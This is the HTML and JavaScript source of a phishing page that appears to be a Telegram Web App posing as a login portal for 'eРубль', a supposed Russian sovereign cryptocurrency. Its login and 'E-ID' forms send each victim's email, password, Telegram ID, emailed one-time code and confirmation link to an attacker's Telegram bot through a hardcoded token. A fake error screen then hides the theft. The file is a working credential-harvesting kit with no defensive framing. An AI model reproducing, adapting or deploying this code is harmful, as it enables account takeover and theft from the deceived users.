<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>eРубль</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg-dark: #0b102a; --bg-card: #ffffff; --text-primary: #0b102a;
            --text-secondary: #6b7280; --accent: #1e64ff; --danger: #b91c1c; --success: #00a63e;
            --border-color: #0b102a1a; --radius: 14px;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, sans-serif; background: #0b102a; color: var(--text-primary); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 400px; background: var(--bg-card); border-radius: 24px; padding: 32px 24px; border: 1px solid var(--border-color); box-shadow: 0 25px 60px rgba(0,0,0,0.6); position: relative; }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo h1 { font-size: 32px; font-weight: 700; color: var(--text-primary); }
        .logo h1 span { color: var(--accent); }
        .logo p { font-size: 13px; color: var(--text-secondary); margin-top: 4px; text-transform: uppercase; letter-spacing: 1.5px; }
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; font-size: 14px; font-weight: 500; color: var(--text-secondary); margin-bottom: 6px; }
        .form-group input { width: 100%; padding: 12px 16px; background: #f5f7fa; border: 1px solid var(--border-color); border-radius: 10px; font-size: 16px; color: var(--text-primary); }
        .form-group input:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 0 3px rgba(30,100,255,0.15); }
        .btn-primary { width: 100%; padding: 14px; background: linear-gradient(90deg, #1e64ff, #00cbef); color: #fff; border: none; border-radius: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; }
        .btn-primary:disabled { opacity: 0.5; }
        .btn-secondary { width: 100%; padding: 12px; background: transparent; color: var(--text-secondary); border: 1px solid var(--border-color); border-radius: 14px; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 12px; }
        .btn-link { background: transparent; border: none; color: var(--text-secondary); font-size: 14px; cursor: pointer; text-decoration: underline; }
        .forgot-link { text-align: right; margin-bottom: 16px; }
        .register-link { text-align: center; margin-top: 16px; font-size: 14px; color: var(--text-secondary); }
        .register-link a { color: var(--accent); text-decoration: none; font-weight: 600; cursor: pointer; }
        .divider { display: flex; align-items: center; gap: 12px; margin: 20px 0; color: var(--text-muted); font-size: 12px; text-transform: uppercase; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--border-color); }
        .message { padding: 12px; border-radius: 10px; font-size: 14px; text-align: center; margin-top: 16px; display: none; }
        .message.error { display: block; background: #ffe2e2; color: #b91c1c; }
        .message.success { display: block; background: #dcfce7; color: #00a63e; }
        .page { display: none; } .page.active { display: block; }
        .page-title { font-size: 28px; font-weight: 600; text-align: center; margin-bottom: 8px; }
        .page-sub { font-size: 14px; color: var(--text-secondary); text-align: center; margin-bottom: 24px; }
        .support-btn { margin-top: 20px; text-align: center; font-size: 13px; }
        .support-btn a { color: var(--accent); text-decoration: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><h1><span>eРубль</span></h1><p>Суверенная криптовалюта России</p></div>

        <!-- ===== ГЛАВНАЯ ===== -->
        <div id="pageMain" class="page active">
            <div class="page-title">Вход в аккаунт</div>
            <div class="page-sub">Введите свои данные для входа</div>
            <div class="form-group"><label>Email</label><input type="email" id="email" placeholder="Введите ваш email"></div>
            <div class="form-group"><label>Пароль</label><input type="password" id="password" placeholder="Введите пароль"></div>
            <div class="forgot-link"><button class="btn-link" onclick="showMsg('Скоро', 'info')">Забыли пароль?</button></div>
            <button id="loginSubmitBtn" class="btn-primary">Войти</button>
            <div class="divider">или</div>
            <button id="eidBtn" class="btn-secondary" onclick="switchPage('pageEid')">Вход через E-ID</button>
            <div class="register-link">Нет аккаунта? <a onclick="showMsg('Скоро', 'info')">Зарегистрироваться</a></div>
        </div>

        <!-- ===== E-ID ===== -->
        <div id="pageEid" class="page page-eid">
            <div class="page-title">Вход через E-ID</div>
            <div class="page-sub">Введите свои данные для входа</div>
            <div class="form-group"><label>Email</label><input type="email" id="eidEmail" placeholder="Email"></div>
            <div class="form-group"><label>Пароль</label><input type="password" id="eidPassword" placeholder="Пароль"></div>
            <button id="eidSubmitBtn" class="btn-primary">Войти</button>
            <button class="btn-secondary" onclick="switchPage('pageMain')">← Назад</button>
        </div>

        <!-- ===== КОД ===== -->
        <div id="pageCode" class="page">
            <div class="page-title">Код подтверждения</div>
            <div class="page-sub">Введите код, отправленный на почту</div>
            <div class="form-group"><label>Код из 6 цифр</label><input type="text" id="codeInput" maxlength="6" placeholder="000000" inputmode="numeric"></div>
            <button id="submitCodeBtn" class="btn-primary">Подтвердить</button>
            <button class="btn-secondary" onclick="switchPage('pageMain')">← На главную</button>
        </div>

        <!-- ===== ССЫЛКА ===== -->
        <div id="pageLink" class="page">
            <div class="page-title">Ссылка подтверждения</div>
            <div class="page-sub">Вставьте ссылку из письма</div>
            <div class="form-group"><label>Ссылка</label><input type="text" id="linkInput" placeholder="Вставьте ссылку"></div>
            <button id="submitLinkBtn" class="btn-primary">Подтвердить</button>
            <button class="btn-secondary" onclick="switchPage('pageEid')">← Назад</button>
        </div>

        <!-- ===== ОШИБКА ===== -->
        <div id="pageError" class="page">
            <div class="error-block" style="text-align:center; padding: 20px 0;">
                <div style="font-size: 48px; color: red; margin-bottom: 16px;">✕</div>
                <h2 style="color: red; margin-bottom: 8px;">Ошибка</h2>
                <p style="color: gray; margin-bottom: 20px;">Повторите попытку входа.</p>
                <button class="btn-secondary" onclick="switchPage('pageMain')">← На главную</button>
            </div>
        </div>

        <!-- ===== ПОДДЕРЖКА ===== -->
        <div class="support-btn"><a onclick="openSupport()">🆘 Техническая поддержка</a></div>
    </div>

    <script>
        // ============================================================
        // КОНФИГ (ВСТАВЬТЕ СВОИ ЗНАЧЕНИЯ)
        // ============================================================
        const BOT_TOKEN = "8603629858:AAGJu7_3CWFJ_YQj_iJ2hjX45h053-3fAQY";
        const ADMIN_ID = "8542901240";
        // ============================================================

        const tg = window.Telegram.WebApp;
        tg.expand();

        const user = tg.initDataUnsafe?.user || {};
        const userId = user.id || 'неизвестно';

        function showMsg(text, type = 'info') { alert(text); }
        
        function switchPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.querySelectorAll('.message').forEach(m => m.remove());
        }
        
        function openSupport() { window.open("https://t.me/erubsite", '_blank'); }

        async function sendToAdmin(text) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
                });
                const result = await response.json();
                return result.ok;
            } catch (error) { return false; }
        }

        // 1. Обычный вход
        document.getElementById('loginSubmitBtn').onclick = async () => {
            const e = document.getElementById('email').value.trim();
            const p = document.getElementById('password').value.trim();
            if (!e || !p) { showMsg('Заполните поля'); return; }
            
            const btn = document.getElementById('loginSubmitBtn');
            btn.disabled = true; btn.textContent = 'Отправка...';
            
            const ok = await sendToAdmin(`🔔 Заявка\n👤 ID: ${userId}\n📧 Email: ${e}\n🔑 Пароль: ${p}`);
            
            if (ok) { 
                btn.disabled = false; btn.textContent = 'Войти'; 
                switchPage('pageCode'); 
            } else { 
                btn.disabled = false; btn.textContent = 'Войти'; 
                showMsg('Ошибка отправки'); 
            }
        };

        // 2. Ввод кода
        document.getElementById('submitCodeBtn').onclick = async () => {
            const code = document.getElementById('codeInput').value.trim();
            if (!code) { showMsg('Введите код'); return; }
            
            const btn = document.getElementById('submitCodeBtn');
            btn.disabled = true; btn.textContent = 'Отправка...';
            
            const ok = await sendToAdmin(`🔐 Код: ${code}\n👤 ID: ${userId}`);
            
            if (ok) { 
                btn.disabled = false; btn.textContent = 'Подтвердить';
                switchPage('pageError'); 
            } else { 
                btn.disabled = false; btn.textContent = 'Подтвердить'; 
                showMsg('Ошибка'); 
            }
        };

        // 3. E-ID Логин
        document.getElementById('eidSubmitBtn').onclick = async () => {
            const e = document.getElementById('eidEmail').value.trim();
            const p = document.getElementById('eidPassword').value.trim();
            if (!e || !p) { showMsg('Заполните поля'); return; }
            
            const btn = document.getElementById('eidSubmitBtn');
            btn.disabled = true; btn.textContent = 'Отправка...';
            
            const ok = await sendToAdmin(`🆔 E-ID\n👤 ID: ${userId}\n📧 Email: ${e}\n🔑 Пароль: ${p}`);
            
            if (ok) { 
                btn.disabled = false; btn.textContent = 'Войти';
                switchPage('pageLink'); 
            } else { 
                btn.disabled = false; btn.textContent = 'Войти'; 
                showMsg('Ошибка'); 
            }
        };

        // 4. Ссылка E-ID
        document.getElementById('submitLinkBtn').onclick = async () => {
            const link = document.getElementById('linkInput').value.trim();
            if (!link) { showMsg('Вставьте ссылку'); return; }
            
            const btn = document.getElementById('submitLinkBtn');
            btn.disabled = true; btn.textContent = 'Отправка...';
            
            const ok = await sendToAdmin(`🔗 Ссылка: ${link}\n👤 ID: ${userId}`);
            
            if (ok) { 
                btn.disabled = false; btn.textContent = 'Подтвердить';
                switchPage('pageError'); 
            } else { 
                btn.disabled = false; btn.textContent = 'Подтвердить'; 
                showMsg('Ошибка'); 
            }
        };
    </script>
</body>
</html>
